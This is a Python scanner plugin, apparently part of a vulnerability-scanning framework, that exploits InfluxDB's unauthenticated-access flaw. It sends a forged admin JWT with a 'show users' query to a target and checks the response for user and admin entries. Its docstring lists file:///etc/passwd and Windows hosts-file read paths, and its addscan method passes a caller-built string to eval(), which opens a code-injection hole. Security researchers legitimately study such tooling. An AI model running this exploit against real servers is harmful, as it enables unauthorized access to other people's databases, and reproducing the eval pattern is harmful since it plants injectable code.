#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
influxdb是一款著名的时序数据库
    influxdb扫描类: 
        influxdb 未授权访问
            暂无编号
                Payload: https://vulhub.org/#/environments/influxdb/unacc/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class Influxdb():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'influxdb'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.influxdb_unauthorized_payloads = [
            {
                'path': 'query',
                'data': 'db=sample&q=show+users',
                'headers': head.merge(self.headers, {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo2NjY2NjY2NjY2fQ.XVfnw6S7uq4i9_RraPztULowgOlKLkX60MYcXWZbot0'})
            },
        ]

    def influxdb_unauthorized_scan(self, url):
        ''' 其使用jwt作为鉴权方式。在用户开启了认证, 但未设置参数shared-secret的情况下, jwt的认证密钥为空字符串, 此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'influxdb-unAuthorized'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.influxdb_unauthorized_payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('results' in res.text)
                and ('statement_id' in res.text)
                and ('series' in res.text)
                and ('columns' in res.text)
                and ('user' in res.text)
                and ('admin' in res.text)
                and ('values' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.influxdb_unauthorized_scan, url=url)
        ]

influxdb = Influxdb()
